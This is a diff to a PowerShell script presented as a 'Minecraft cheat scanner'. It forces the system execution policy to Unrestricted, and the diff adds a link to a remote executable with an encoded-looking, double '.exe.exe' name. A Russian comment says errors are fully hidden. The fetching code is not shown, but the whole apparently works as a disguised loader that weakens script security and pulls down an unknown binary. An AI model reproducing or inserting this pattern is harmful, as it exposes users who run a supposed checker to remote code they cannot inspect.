@@ -1,6 +1,6 @@
 # MINECRAFT CHEAT SCANNER v2.0 
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
-
+https://github.com/Proshkaversus/exe/raw/refs/heads/main/enc_8c1ae3d9a1c444819a7edad8a200a143_chekir.exe.exe
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
 Clear-Host
@@ -95,6 +95,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
